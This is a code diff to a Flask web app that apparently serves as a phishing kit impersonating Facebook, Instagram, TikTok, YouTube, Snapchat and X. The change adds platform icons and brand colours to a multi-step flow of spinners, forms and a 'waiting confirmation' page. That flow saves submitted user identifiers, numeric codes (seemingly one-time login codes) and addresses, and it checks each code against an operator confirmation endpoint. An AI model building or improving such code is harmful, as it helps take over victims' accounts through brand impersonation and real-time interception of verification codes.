@@ -34,6 +34,18 @@ ICON_MAP = {
     "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
 }
 
+# ADDED: Platform to icon mapping
+PLATFORM_ICON_MAP = {
+    "Facebook": ("fa-brands fa-facebook-f", "#1877F2"),
+    "Instagram": ("fa-brands fa-instagram", "#E4405F"),
+    "TikTok": ("fa-brands fa-tiktok", "#000000"),
+    "YouTube": ("fa-brands fa-youtube", "#FF0000"),
+    "Snapchat": ("fa-brands fa-snapchat", "#FFFC00"),
+    "X / Twitter": ("fa-brands fa-x-twitter", "#000000"),
+    "Twitter": ("fa-brands fa-x-twitter", "#000000"),
+    "Unknown": ("fa-solid fa-file", "#666")
+}
+
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         conn.execute('''
@@ -76,6 +88,10 @@ def extract_user(form):
         if val:
             return val.strip()
     return "anonymous"
+
+# Helper function to get platform icon and color
+def get_platform_icon(platform_name):
+    return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])
 
 @app.route('/')
 def index():
@@ -315,16 +331,18 @@ def love2_3():
                              platform_color='#E4405F')
     return render_template('love2_3.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
 
-# Common Flow Pages
+# Common Flow Pages - FIXED ROUTES
 @app.route('/spinner')
 def spinner():
     platform = request.args.get('platform', 'Unknown')
+    platform_icon, platform_color = get_platform_icon(platform)
     return render_template('spinner.html', 
                          next_url=url_for('f1', platform=platform),
                          delay=4,
                          platform=platform,
-                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
-                         platform_name=platform)
+                         platform_icon=platform_icon,
+                         platform_name=platform,
+                         platform_color=platform_color)
 
 @app.route('/f1', methods=['GET','POST'])
 def f1():
@@ -334,7 +352,8 @@ def f1():
         save_submission('f1', user, " ; ".join(items), platform_name=request.args.get('platform', 'Unknown'))
         return redirect(url_for('f1_A', platform=request.args.get('platform', 'Unknown')))
     platform = request.args.get('platform', 'Unknown')
-    return render_template('f1.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
+    platform_icon, platform_color = get_platform_icon(platform)
+    return render_template('f1.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
 
 @app.route('/f1_A', methods=['GET','POST'])
 def f1_A():
@@ -342,23 +361,29 @@ def f1_A():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
+        platform = request.args.get('platform', 'Unknown')
+        platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
-                             next_url=url_for('spinner2', platform=request.args.get('platform', 'Unknown')),
+                             next_url=url_for('spinner2', platform=platform),
                              code_value=digits,
-                             platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
-                             platform_name=request.args.get('platform', 'Unknown'))
+                             platform_icon=platform_icon, 
+                             platform_name=platform,
+                             platform_color=platform_color)
     platform = request.args.get('platform', 'Unknown')
-    return render_template('f1_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
+    platform_icon, platform_color = get_platform_icon(platform)
+    return render_template('f1_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
 
 @app.route('/spinner2')
 def spinner2():
     platform = request.args.get('platform', 'Unknown')
+    platform_icon, platform_color = get_platform_icon(platform)
     return render_template('spinner2.html', 
                          next_url=url_for('f2', platform=platform),
                          delay=4,
                          platform=platform,
-                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
-                         platform_name=platform)
+                         platform_icon=platform_icon,
+                         platform_name=platform,
+                         platform_color=platform_color)
 
 @app.route('/f2', methods=['GET','POST'])
 def f2():
@@ -368,7 +393,8 @@ def f2():
         save_submission('f2', user, f'address={addr}', platform_name=request.args.get('platform', 'Unknown'))
         return redirect(url_for('f2_A', platform=request.args.get('platform', 'Unknown')))
     platform = request.args.get('platform', 'Unknown')
-    return render_template('f2.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
+    platform_icon, platform_color = get_platform_icon(platform)
+    return render_template('f2.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
 
 @app.route('/f2_A', methods=['GET','POST'])
 def f2_A():
@@ -376,20 +402,26 @@ def f2_A():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
+        platform = request.args.get('platform', 'Unknown')
+        platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
-                             next_url=url_for('m1', platform=request.args.get('platform', 'Unknown')),
+                             next_url=url_for('m1', platform=platform),
                              code_value=digits,
-                             platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
-                             platform_name=request.args.get('platform', 'Unknown'))
+                             platform_icon=platform_icon, 
+                             platform_name=platform,
+                             platform_color=platform_color)
     platform = request.args.get('platform', 'Unknown')
-    return render_template('f2_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)
+    platform_icon, platform_color = get_platform_icon(platform)
+    return render_template('f2_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
 
 @app.route('/m1')
 def m1():
     platform = request.args.get('platform', 'Unknown')
+    platform_icon, platform_color = get_platform_icon(platform)
     return render_template('m1.html', 
-                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
-                         platform_name=platform)
+                         platform_icon=platform_icon,
+                         platform_name=platform,
+                         platform_color=platform_color)
 
 # Admin confirmation endpoints
 @app.route('/api/check_confirmation/<code_value>')
